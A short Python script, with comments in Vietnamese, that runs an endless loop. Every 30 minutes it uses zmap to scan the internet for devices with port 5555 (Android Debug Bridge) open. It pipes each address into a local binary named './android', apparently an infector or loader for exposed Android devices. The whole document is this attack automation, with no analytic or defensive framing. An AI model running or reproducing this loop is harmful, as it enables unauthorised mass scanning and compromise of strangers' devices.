import subprocess
import time

# Lệnh cần chạy
command = "zmap -p 5555 -o- -q -v0 -T3 | awk '{print $1\":5555\"}' | ./android"

while True:
    print("[+] Running command...")
    try:
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] Command failed: {e}")

    print("[+] Waiting 30 minutes...")
    time.sleep(1800)  # 30 phút = 1800 giây